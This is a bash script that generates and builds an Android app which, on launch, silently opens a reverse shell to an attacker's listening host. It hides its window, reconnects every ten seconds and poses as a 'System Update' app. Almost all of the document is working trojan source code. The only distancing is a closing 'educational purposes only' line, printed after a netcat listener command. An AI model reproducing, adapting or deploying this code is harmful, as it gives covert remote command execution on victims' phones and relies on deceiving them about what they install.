#!/bin/bash

# Configuration - SET YOUR VALUES HERE
LHOST="192.168.1.100"  # Change to your IP
LPORT="443"            # Change to your port

echo "Creating Android Reverse Shell APK with LHOST=$LHOST and LPORT=$LPORT"

# Create the directory structure
mkdir -p Android-ReverseShell/app/src/main/java/com/example/reverseshell
mkdir -p Android-ReverseShell/app/src/main/res/layout
mkdir -p Android-ReverseShell/app/src/main/res/values

# Create MainActivity.java with auto-connect
cat > Android-ReverseShell/app/src/main/java/com/example/reverseshell/MainActivity.java << EOF
package com.example.reverseshell;

import android.content.Intent;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    
    // Pre-configured LHOST and LPORT
    private static final String LHOST = "$LHOST";
    private static final int LPORT = $LPORT;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Auto-start the reverse shell without UI
        startReverseShell();
        finish(); // Close the activity immediately
    }

    private void startReverseShell() {
        Intent serviceIntent = new Intent(this, ReverseShellService.class);
        serviceIntent.putExtra("host", LHOST);
        serviceIntent.putExtra("port", LPORT);
        startService(serviceIntent);
    }
}
EOF

# Create ReverseShellService.java
cat > Android-ReverseShell/app/src/main/java/com/example/reverseshell/ReverseShellService.java << 'EOF'
package com.example.reverseshell;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class ReverseShellService extends Service {
    private static final String TAG = "ReverseShellService";
    private ConnectionManager connectionManager;
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("host") && intent.hasExtra("port")) {
            String host = intent.getStringExtra("host");
            int port = intent.getIntExtra("port", 443);
            
            connectionManager = new ConnectionManager();
            connectionManager.startReverseShell(host, port);
        }
        return START_STICKY;
    }
    
    @Override
    public void onDestroy() {
        if (connectionManager != null) {
            connectionManager.stop();
        }
        super.onDestroy();
    }
}
EOF

# Create ConnectionManager.java with complete reverse shell
cat > Android-ReverseShell/app/src/main/java/com/example/reverseshell/ConnectionManager.java << 'EOF'
package com.example.reverseshell;

import android.util.Log;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class ConnectionManager {
    private static final String TAG = "ConnectionManager";
    private Socket socket;
    private Process shellProcess;
    private boolean isRunning = false;

    public void startReverseShell(String host, int port) {
        if (isRunning) return;
        
        new Thread(() -> {
            try {
                Log.d(TAG, "Attempting to connect to " + host + ":" + port);
                socket = new Socket(host, port);
                isRunning = true;
                Log.d(TAG, "Connected successfully");
                
                // Start shell process
                shellProcess = Runtime.getRuntime().exec("sh");
                
                // Set up I/O streams
                InputStream shellInput = shellProcess.getInputStream();
                InputStream shellError = shellProcess.getErrorStream();
                OutputStream shellOutput = shellProcess.getOutputStream();
                
                InputStream socketInput = socket.getInputStream();
                OutputStream socketOutput = socket.getOutputStream();
                
                // Thread for reading from socket and writing to shell
                Thread socketToShell = new Thread(() -> {
                    try {
                        byte[] buffer = new byte[1024];
                        int length;
                        while (isRunning && (length = socketInput.read(buffer)) != -1) {
                            shellOutput.write(buffer, 0, length);
                            shellOutput.flush();
                        }
                    } catch (IOException e) {
                        Log.e(TAG, "Socket to shell error: " + e.getMessage());
                    }
                });
                
                // Thread for reading from shell and writing to socket
                Thread shellToSocket = new Thread(() -> {
                    try {
                        byte[] buffer = new byte[1024];
                        int length;
                        while (isRunning && (length = shellInput.read(buffer)) != -1) {
                            socketOutput.write(buffer, 0, length);
                            socketOutput.flush();
                        }
                    } catch (IOException e) {
                        Log.e(TAG, "Shell to socket error: " + e.getMessage());
                    }
                });
                
                // Thread for reading from shell error and writing to socket
                Thread errorToSocket = new Thread(() -> {
                    try {
                        byte[] buffer = new byte[1024];
                        int length;
                        while (isRunning && (length = shellError.read(buffer)) != -1) {
                            socketOutput.write(buffer, 0, length);
                            socketOutput.flush();
                        }
                    } catch (IOException e) {
                        Log.e(TAG, "Error to socket error: " + e.getMessage());
                    }
                });
                
                socketToShell.start();
                shellToSocket.start();
                errorToSocket.start();
                
                // Wait for threads to complete
                socketToShell.join();
                shellToSocket.join();
                errorToSocket.join();
                
            } catch (Exception e) {
                Log.e(TAG, "Reverse shell error: " + e.getMessage());
                // Auto-reconnect after 10 seconds
                try {
                    Thread.sleep(10000);
                    Log.d(TAG, "Attempting to reconnect...");
                    startReverseShell(host, port);
                } catch (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                }
            } finally {
                stop();
            }
        }).start();
    }
    
    public void stop() {
        isRunning = false;
        try {
            if (socket != null) socket.close();
            if (shellProcess != null) shellProcess.destroy();
        } catch (IOException e) {
            Log.e(TAG, "Cleanup error: " + e.getMessage());
        }
    }
}
EOF

# Create Utils.java
cat > Android-ReverseShell/app/src/main/java/com/example/reverseshell/Utils.java << 'EOF'
package com.example.reverseshell;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;

public class Utils {
    public static boolean isNetworkAvailable(Context context) {
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
        return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
    }
}
EOF

# Create minimal layout file
cat > Android-ReverseShell/app/src/main/res/layout/activity_main.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical">
    
    <!-- Empty layout since we auto-connect -->
    
</LinearLayout>
EOF

# Create strings.xml
cat > Android-ReverseShell/app/src/main/res/values/strings.xml << 'EOF'
<resources>
    <string name="app_name">System Update</string>
</resources>
EOF

# Create AndroidManifest.xml
cat > Android-ReverseShell/app/src/main/AndroidManifest.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.reverseshell">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/Theme.AppCompat.Light">

        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <service android:name=".ReverseShellService" />

    </application>

</manifest>
EOF

# Create app build.gradle
cat > Android-ReverseShell/app/build.gradle << 'EOF'
plugins {
    id 'com.android.application'
}

android {
    compileSdkVersion 31
    buildToolsVersion "30.0.3"

    defaultConfig {
        applicationId "com.example.systemupdate"
        minSdkVersion 21
        targetSdkVersion 31
        versionCode 1
        versionName "1.0"
    }

    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.4.1'
    implementation 'com.google.android.material:material:1.5.0'
}
EOF

# Create project build.gradle
cat > Android-ReverseShell/build.gradle << 'EOF'
buildscript {
    repositories {
        google()
        mavenCentral()
    }
    dependencies {
        classpath "com.android.tools.build:gradle:7.0.4"
    }
}

allprojects {
    repositories {
        google()
        mavenCentral()
    }
}

task clean(type: Delete) {
    delete rootProject.buildDir
}
EOF

# Create settings.gradle
cat > Android-ReverseShell/settings.gradle << 'EOF'
pluginManagement {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
}
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        google()
        mavenCentral()
    }
}
rootProject.name = "SystemUpdate"
include ':app'
EOF

echo "Building APK..."
cd Android-ReverseShell

# Build the APK
if /root/.gradle/bin/gradle build assembleRelease 2>/dev/null; then
    echo "APK built successfully!"
    echo "APK location: app/build/outputs/apk/release/app-release.apk"
    echo ""
    echo "To set up listener on your machine:"
    echo "  nc -lvnp $LPORT"
    echo ""
    echo "Warning: This is for educational purposes only!"
else
    echo "Build failed. Make sure you have Android SDK and Gradle installed."
    echo "You may need to install Android Studio or set up the build environment."
fi
